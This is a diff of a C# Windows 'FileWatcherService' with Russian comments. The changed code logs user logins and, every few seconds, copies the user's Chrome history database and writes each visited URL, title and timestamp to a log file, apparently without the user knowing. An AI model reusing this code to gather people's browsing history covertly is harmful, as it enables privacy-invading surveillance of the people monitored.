@@ -14,68 +14,71 @@ using WindowsMonitorService;
 using System.Collections.ObjectModel;
 using System.Collections;
 using System.Management;
-using Microsoft.Win32;
 
 namespace FileWatcherService
 {
     public partial class Service1 : ServiceBase
     {
         Logger logger;
+        string UserName;
         public Service1()
         {
             InitializeComponent();
-            //события службы
+            GetUserName();
+
+
             this.CanStop = true;
             this.CanPauseAndContinue = true;
             this.AutoLog = true;
 
             this.CanHandleSessionChangeEvent = true;
-
-            //системные события
-            SystemEvents.SessionEnded += OnSessionEnded;
-        }
-
-        /// <summary>
-        /// Отслеживание выключения компа
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void OnSessionEnded(object sender, SessionEndedEventArgs e)
-        {
-            if (e.Reason == SessionEndReasons.SystemShutdown)
-            {
-                //будем отправлять на сервер что комп отключили
-            }
         }
 
         protected override void OnSessionChange(SessionChangeDescription obj)
         {
-
-            logger.UserName = GetUserName();
-
+            GetUserName();
         }
 
-        /// <summary>
-        /// Получение имени учетной записи пользователя 
-        /// </summary>
-        /// <returns>Имя учетки в ОС</returns>
-        private string GetUserName()
+        private void GetUserName()
         {
+            object obj = new object();
+
             ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem");
             ManagementObjectCollection collection = searcher.Get();
-            return collection.Cast<ManagementBaseObject>().First()["UserName"].ToString().Split('\\')[1].Split('-')[0]; ;
+            string s = collection.Cast<ManagementBaseObject>().First()["UserName"].ToString().Split('\\')[1].Split('-')[0];
+
+            if (UserName != s)
+            {
+                lock (obj)
+                {
+                    using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
+                    {
+                        writer.WriteLine($"{s} вошел в систему {DateTime.Now.ToString()}");
+                        writer.Flush();
+                    }
+                }
+
+                UserName = s;
+            }
         }
+
+
 
         protected override void OnStart(string[] args)
         {
-            logger = new Logger(GetUserName());
+
+            logger = new Logger(UserName);
+            logger.RecordEntry("Служба запущенна!");
             Thread loggerThread = new Thread(new ThreadStart(logger.Start));
             loggerThread.Start();
         }
 
+
+
         protected override void OnStop()
         {
             logger.Stop();
+            logger.RecordEntry("Служба остановлена!");
             Thread.Sleep(4000);
         }
     }
@@ -128,7 +131,7 @@ namespace FileWatcherService
             }
             catch (Exception ex)
             {
-                RecordEntry(ex.Message, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\t");
+                RecordEntry(ex.Message);
             }
         }
 
@@ -171,7 +174,7 @@ namespace FileWatcherService
             }
             catch (Exception ex)
             {
-                RecordEntry(ex.Message, "");
+                RecordEntry(ex.Message);
             }
         }
 
@@ -216,7 +219,7 @@ namespace FileWatcherService
             }
             catch (Exception ex)
             {
-                RecordEntry(ex.Message, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\t");
+                RecordEntry(ex.Message);
             }
         }
 
@@ -226,11 +229,11 @@ namespace FileWatcherService
         /// <summary>
         /// Копирование файла истории Google
         /// </summary>
-        private void readHistoryGoogle()
+        private void copyHistoryGoogle()
         {
-            
             try
             {
+
                 string google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";
 
                 string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\");
@@ -243,7 +246,12 @@ namespace FileWatcherService
 
                     }
                 }
-                File.AppendAllText("bla.txt", UserName);
+
+                if (File.Exists("D:\\historyGoogle.db"))
+                {
+                    File.Delete("D:\\historyGoogle.db");
+                }
+
                 using (FileStream ms = new FileStream(google, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                 {
                     ms.Seek(0, SeekOrigin.Begin);
@@ -255,13 +263,15 @@ namespace FileWatcherService
                     }
 
                     File.WriteAllBytes("D:\\historyGoogle.db", buffer);
+                    ms.Close();
+                    ms.Dispose();
                     //readHistory();
                 }
                 google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";
             }
             catch (Exception ex)
             {
-                RecordEntry(ex.Message, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\t");
+                RecordEntry(ex.Message);
             }
 
 
@@ -272,47 +282,119 @@ namespace FileWatcherService
 
             while (enabled)
             {
-                RecordEntry("Fadfasfa", "ERROR");
-                Thread.Sleep(60000);
-                readHistoryGoogle();
-                readHistoryYandex();
-                readHistoryFirefox();
-                readHistoryOpera();
-                readHistory();
+                try
+                {
+                    Thread.Sleep(3000);
+                    copyHistoryGoogle();
+                    her();
+                }
+                catch (Exception d)
+                {
+                    RecordEntry(d.Message);
+                    RecordEntry(d.Source);
+                }
+
+                //readHistoryYandex();
+                //readHistoryFirefox();
+                //readHistoryOpera();
+
+
             }
         }
         const string databaseName = @"D:\\historyGoogle.db";
-
-
-       string readHistory()
+        private void her()
         {
-            RecordEntry("Zaraza!", "");
-            SQLiteConnection connection = null;
             try
             {
-                connection = new SQLiteConnection(string.Format($"Data Source={databaseName};"));
-                 connection.Open();
-                StringBuilder stringBuilder = new StringBuilder();
-
-                DbDataReader r =  new SQLiteCommand($"SELECT * FROM urls ", connection).ExecuteReader();
-                if (r.HasRows)
+                if (File.Exists(databaseName))
                 {
-                    while ( r.Read())
+                    RecordEntry("+");
+                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={databaseName};")))
                     {
-                        stringBuilder.Append(r.GetValue(1));
+                        connection.Open();
+                        StringBuilder stringBuilder = new StringBuilder();
+
+                        DbDataReader r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
+                        if (r.HasRows)
+                        {
+                            while (r.Read())
+                            {
+                                stringBuilder.Append("title:\t");
+                                stringBuilder.Append(r.GetValue(2));
+                                stringBuilder.Append("\turl:\t");
+                                stringBuilder.Append(r.GetValue(1));
+                                stringBuilder.Append("\tlast time:\t");
+                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
+                                stringBuilder.Append("\r\n\r");
+                            }
+                        }
+
+                        RecordEntry(stringBuilder.ToString());
                     }
                 }
-                RecordEntry(r.FieldCount.ToString(), "");
-                return stringBuilder.ToString();
+                else
+                {
+                    RecordEntry("-");
+                }
             }
             catch (Exception ex)
             {
-                RecordEntry(ex.Message, "");
+                RecordEntry(ex.Message);
             }
-            finally
+
+
+            //RecordEntry("Test -1");
+            //try
+            //{
+            //    RecordEntry("Test -2" );
+            //   using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={databaseName};")))
+            //    { }
+            //    //{
+            //    //    RecordEntry("Test");
+            //    //}
+            //}
+            //catch (Exception ex)
+            //{
+
+            //    RecordEntry(ex.Message);
+            //}
+        }
+
+        string test()
+        {
+
+            try
             {
-                if (connection != null && connection.State == System.Data.ConnectionState.Closed) connection.Close();
+
+                using (SQLiteConnection connection = new SQLiteConnection($"Data Source={"D:\\historyGoogle.db"};"))
+                {
+                    File.AppendAllText("D:\\t.txt", "open copy");
+                    connection.Open();
+                    StringBuilder stringBuilder = new StringBuilder();
+
+                    DbDataReader r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
+                    File.AppendAllText("D:\\t.txt", "start select");
+                    if (r.HasRows)
+                    {
+                        while (r.Read())
+                        {
+                            for (int i = 0; i < r.FieldCount; i++)
+                            {
+                                stringBuilder.Append("\t" + r.GetValue(i));
+                            }
+                        }
+                    }
+                    File.AppendAllText("D:\\t.txt", "return copy");
+                    if (stringBuilder.Length > 0)
+                        return stringBuilder.ToString();
+                    return "";
+                }
             }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+
             return String.Empty;
         }
 
@@ -323,14 +405,17 @@ namespace FileWatcherService
         }
 
 
-        protected void RecordEntry(string fileEvent, string filePath)
+        //открой sqllite studio
+
+
+        public void RecordEntry(string fileEvent)
         {
             lock (obj)
             {
                 using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                 {
-                    writer.WriteLine(String.Format("{0} файл {1} был {2}",
-                        DateTime.Now.ToString("dd/MM/yyyy hh:mm:ss"), filePath, fileEvent));
+                    writer.WriteLine(String.Format("{0} под пользователем {1} произошла ошибка {2}",
+                        DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), UserName, fileEvent));
                     writer.Flush();
                 }
             }
